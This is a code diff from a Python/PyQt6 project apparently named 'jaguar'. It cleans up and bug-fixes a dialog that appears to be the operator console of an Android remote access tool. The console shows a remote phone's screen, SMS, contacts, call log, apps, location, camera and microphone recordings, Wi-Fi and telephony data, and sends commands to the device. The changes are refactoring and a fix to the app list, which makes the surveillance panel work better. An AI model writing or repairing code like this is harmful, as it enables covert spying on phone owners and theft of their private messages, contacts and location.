@@ -13,7 +13,6 @@ muestra el error concreto en vez de fallar en silencio.
 """
 import base64
 import json
-import os
 import time
 
 from PyQt6.QtCore import Qt, pyqtSignal, QTimer
@@ -21,8 +20,8 @@ from PyQt6.QtGui import QPixmap
 from PyQt6.QtWidgets import (
     QDialog, QWidget, QVBoxLayout, QHBoxLayout, QGridLayout, QLabel,
     QPushButton, QTabWidget, QPlainTextEdit, QTreeWidget, QTreeWidgetItem,
-    QLineEdit, QComboBox, QSlider, QCheckBox, QGroupBox, QSplitter,
-    QMessageBox, QApplication, QSpinBox, QListWidget, QListWidgetItem,
+    QLineEdit, QComboBox, QSlider, QCheckBox, QGroupBox, QMessageBox,
+    QSpinBox, QListWidget,
 )
 
 from jaguar.ui.theme import aplicar_tema_rojo_negro, ESTILO_BOTON, TENUE
@@ -44,6 +43,8 @@ class MovilDialog(QDialog):
         self._off_x = 0
         self._off_y = 0
         self._vivo = False
+        self._cam_raw = None
+        self._mic_raw = None
 
         self.setWindowTitle(f"Móvil — {self.info.get('host', nombre)} ({cid[:8]})")
         self.resize(1240, 840)
@@ -63,7 +64,6 @@ class MovilDialog(QDialog):
         raiz.setContentsMargins(10, 8, 10, 8)
         raiz.setSpacing(6)
 
-        # ---- cabecera ----
         cab = QWidget()
         ch = QHBoxLayout(cab)
         ch.setContentsMargins(0, 0, 0, 0)
@@ -87,7 +87,6 @@ class MovilDialog(QDialog):
         ch.addWidget(b_ref)
         raiz.addWidget(cab)
 
-        # ---- pestañas ----
         self.tabs = QTabWidget()
         self.tabs.setDocumentMode(True)
         self.tabs.addTab(self._tab_pantalla(), "  📺 Pantalla  ")
@@ -433,10 +432,12 @@ class MovilDialog(QDialog):
 
     def _abrir_mapa(self):
         import webbrowser
-        t = self.out_ubi.toPlainText()
         import re
-        m = re.search(r'"latitude":\s*([-\d.]+)', t) or re.search(r"lat[^-\d]*([-\d.]+)", t)
-        n = re.search(r'"longitude":\s*([-\d.]+)', t) or re.search(r"lon[^-\d]*([-\d.]+)", t)
+        t = self.out_ubi.toPlainText()
+        m = (re.search(r'"latitude":\s*([-\d.]+)', t)
+             or re.search(r"lat[^-\d]*([-\d.]+)", t))
+        n = (re.search(r'"longitude":\s*([-\d.]+)', t)
+             or re.search(r"lon[^-\d]*([-\d.]+)", t))
         if m and n:
             webbrowser.open(f"https://www.google.com/maps?q={m.group(1)},{n.group(1)}")
 
@@ -452,7 +453,7 @@ class MovilDialog(QDialog):
         barra.addWidget(b)
         barra.addWidget(QLabel("Leer:"))
         self.in_sensor = QLineEdit()
-        self.in_sensor.setPlaceholderText("acelerometer")
+        self.in_sensor.setPlaceholderText("accelerometer")
         barra.addWidget(self.in_sensor, 1)
         b2 = QPushButton("📡 Leer")
         b2.setStyleSheet(ESTILO_BOTON)
@@ -587,9 +588,8 @@ class MovilDialog(QDialog):
                 ("🔊 Volumen máx", "movil_volumen")]):
             b = QPushButton(txt)
             b.setStyleSheet(ESTILO_BOTON)
-            b.clicked.connect(lambda _, c=cmd: self._enviar(c,
-                                                            {"texto": self.in_ex_texto.text(),
-                                                             "titulo": "Jaguar"}))
+            b.clicked.connect(lambda _, c=cmd: self._enviar(
+                c, {"texto": self.in_ex_texto.text(), "titulo": "Jaguar"}))
             g1l.addWidget(b, 1 + i // 3, i % 3)
         l.addWidget(g1)
 
@@ -645,9 +645,9 @@ class MovilDialog(QDialog):
             self._mic_raw = raw
             self.out_mic.appendPlainText(
                 f"[mic] grabado {len(raw)} bytes ({datos.get('segundos')}s)")
-        elif cmd in ("movil_ubicacion",):
+        elif cmd == "movil_ubicacion":
             self.out_ubi.setPlainText(json.dumps(datos, indent=2, ensure_ascii=False))
-        elif cmd in ("movil_sensores",):
+        elif cmd == "movil_sensores":
             self.out_sens.setPlainText(json.dumps(datos, indent=2, ensure_ascii=False))
         elif cmd in ("movil_bateria", "movil_almacenamiento", "movil_wifi",
                      "movil_wifi_scan", "movil_telefonia", "movil_procesos",
@@ -660,11 +660,11 @@ class MovilDialog(QDialog):
                 f"[{cmd}] {json.dumps(datos, ensure_ascii=False)[:800]}")
 
     def _pintar_info(self, d):
-        modelo = f"{d.get('marca','')} {d.get('modelo','')}".strip() or "Android"
+        modelo = f"{d.get('marca', '')} {d.get('modelo', '')}".strip() or "Android"
         self.lbl_modelo.setText(
-            f"<b style='color:#ff2b2b;'>{modelo}</b> · Android {d.get('android','?')} "
-            f"(SDK {d.get('sdk','?')}) · {d.get('operador','')}")
-        bat = d.get("bateria", {})
+            f"<b style='color:#ff2b2b;'>{modelo}</b> · Android {d.get('android', '?')} "
+            f"(SDK {d.get('sdk', '?')}) · {d.get('operador', '')}")
+        bat = d.get("bateria", {}) or {}
         pct = bat.get("percentage")
         temp = bat.get("temperature")
         self.chip_bat.setText(f"🔋 {pct}%" + (f" {temp}°C" if temp else "")
@@ -677,8 +677,8 @@ class MovilDialog(QDialog):
             "padding:4px 9px;color:#3ddc4a;" if d.get("root") else
             "background:#141417;border:1px solid #2a2a30;border-radius:9px;"
             "padding:4px 9px;color:#ffb84d;")
-        self.chip_ip.setText(f"🌐 {d.get('ip','—')}")
-        self._log(f"[info] {modelo} · Android {d.get('android','?')} · "
+        self.chip_ip.setText(f"🌐 {d.get('ip', '—')}")
+        self._log(f"[info] {modelo} · Android {d.get('android', '?')} · "
                   f"root={d.get('root')} · termux-api={d.get('termux_api')}")
 
     def _pintar_sms(self, lista):
@@ -695,8 +695,8 @@ class MovilDialog(QDialog):
             tels = c.get("numeros") or c.get("numbers") or []
             if isinstance(tels, list):
                 tels = ", ".join(str(t) for t in tels)
-            QTreeWidgetItem(self.tabla_cont, [str(c.get("nombre") or c.get("name") or ""),
-                                              str(tels)])
+            QTreeWidgetItem(self.tabla_cont,
+                            [str(c.get("nombre") or c.get("name") or ""), str(tels)])
 
     def _pintar_llamadas(self, lista):
         self.tabla_llam.clear()
@@ -708,7 +708,7 @@ class MovilDialog(QDialog):
     def _pintar_apps(self, lista):
         self.lista_apps.clear()
         for p in lista:
-            QListWidgetItem(str(p))
+            self.lista_apps.addItem(str(p))          # <-- BUG CORREGIDO
 
     def closeEvent(self, e):
         self.timer_pantalla.stop()
